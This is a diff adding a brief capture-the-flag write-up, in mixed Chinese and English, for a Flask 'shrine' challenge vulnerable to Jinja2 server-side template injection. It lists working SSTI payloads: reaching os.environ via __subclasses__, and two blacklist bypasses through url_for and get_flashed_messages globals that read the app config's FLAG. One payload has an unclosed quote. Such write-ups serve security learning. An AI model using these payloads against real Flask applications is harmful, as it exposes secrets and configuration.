@@ -1,0 +1,25 @@
+@ app.route（'/ shrine / <path:shrine>'）⇒插入点是/ shrine /之后的URL
+s = s.replace（'（'，））。replace（''''，''）⇒ ( )将被删除
+黑名单= ['config'，'self']⇒ config， self将被删除
+返回flask.render_template_string（safe_jinja（shrine））⇒ Vulnerability is SSTI by Jinja2 (Server Side Template Injection)
+
+【如果没有WAF 】 
+    1.可以使用 config
+        /shrine/{{config}}
+    2.可以使用 self
+        {{self.__dict__}}
+    3.可以使用 '(' and ')'
+        {{[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG]}}
+
+
+
+【方法1.在url_for中发现current_app】 
+    {{url_for}}
+    {{url_for.__globals__}}
+    payload:/shrine/{{url_for.__globals__['current_app'].config['FLAG']}}
+
+
+【方法二：在get_flashed_messages中发现current_app】 
+    {{get_flashed_messages}}
+    {{get_flashed_messages.__globals__}}
+    payload:/shrine/{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
